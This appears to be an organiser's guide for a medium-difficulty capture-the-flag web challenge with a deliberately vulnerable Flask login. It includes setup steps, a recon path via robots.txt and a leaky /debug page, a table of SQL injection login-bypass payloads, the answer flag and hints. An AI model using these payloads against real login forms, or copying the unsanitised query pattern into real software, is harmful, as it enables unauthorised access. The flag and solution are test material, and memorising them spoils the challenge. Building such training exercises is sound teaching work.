# PHANTOM NET — CTF Round 2 Challenge
## Web Exploitation / SQL Injection

---

## 📁 FILE STRUCTURE

```
phantom_net/
├── app.py                  ← Flask app (vulnerable login route)
├── init_db.py              ← Run once to create SQLite DB
├── requirements.txt        ← Flask dependency
├── phantom.db              ← Created by init_db.py (DO NOT share)
└── templates/
    ├── login.html          ← Login page (no flag here)
    └── records.html        ← Records page (flag rendered server-side)
```

---

## ⚙️ SETUP INSTRUCTIONS

```bash
# 1. Install Flask
pip install -r requirements.txt

# 2. Create the database
python init_db.py

# 3. Start the server
python app.py

# App runs at → http://localhost:5000
```

---

## 🧩 CHALLENGE DESCRIPTION (give to players)

> *"We've seized the killer's laptop. His dark-web contractor portal —
> PHANTOM NET — is running on our forensic VM at the given IP.
> Police need to access the records. Break in and retrieve
> the proof-of-access token hidden inside."*

**URL:** `http://<server-ip>:5000`

---

## 🔐 DIFFICULTY PATH (Medium)

Players must discover these steps on their own:

### Step 1 — Reconnaissance
Visit `/robots.txt`
```
Disallow: /records
Disallow: /admin_panel
# Note to dev: remove /debug before live deployment
```
This reveals a hidden endpoint: `/debug`

### Step 2 — Leak at /debug
```
SELECT * FROM operators
WHERE username='<INPUT>' AND password='<INPUT>'
```
This reveals the SQL query shape — confirming SQL injection is possible.

### Step 3 — SQL Injection Bypass
In the login form, use any of these payloads:

| Username Field            | Password  | Why it works                        |
|---------------------------|-----------|-------------------------------------|
| `' OR '1'='1`             | anything  | OR clause always true               |
| `' OR 1=1--`              | anything  | Comments out password check         |
| `admin'--`                | anything  | Comments out AND password condition |
| `' OR 'x'='x`            | anything  | String comparison always true       |

### Step 4 — Flag
After login, records page loads. The flag appears in contract **C-009**.

```
FLAG: CTF{5ql_1nj3ct10n_k1ll3r_d4t4b453_pwn3d}
```

---

## 🔒 WHY FLAG IS HIDDEN FROM SOURCE

- Flag is stored only in `phantom.db → secrets table`
- Retrieved at login time via Python, passed to Jinja template
- Viewing HTML source of login page → no flag
- Viewing page source of records → flag visible ONLY after login
- Network tab shows nothing useful before auth

---

## 💡 HINTS (give only if stuck)

| Hint Level | Hint Text                                      |
|------------|------------------------------------------------|
| Hint 1     | "What does the server tell search engines?"    |
| Hint 2     | "The dev left a debug page. Find it."          |
| Hint 3     | "The login query trusts user input blindly."   |
